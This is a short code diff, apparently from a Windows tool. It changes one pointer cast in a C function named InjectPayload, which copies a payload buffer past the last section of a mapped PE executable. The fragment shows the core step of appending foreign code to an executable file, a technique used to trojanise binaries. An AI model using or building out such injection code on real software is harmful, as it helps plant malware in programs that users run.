@@ -67,7 +67,7 @@ VOID InjectPayload(IN CONST PIMAGE_DOS_HEADER pMapAddress, IN CONST PCBYTE pPayl
     printf("New payload:\n");
     HexDump(pPayload, dwPayloadSize);
 
-    memcpy((PUCHAR)pMapAddress + dwLastSectionPtr + dwLastSectionSize, pPayload, dwPayloadSize);
+    memcpy((PBYTE)pMapAddress + dwLastSectionPtr + dwLastSectionSize, pPayload, dwPayloadSize);
 }
 
 int main(int argc, char* argv[]) {
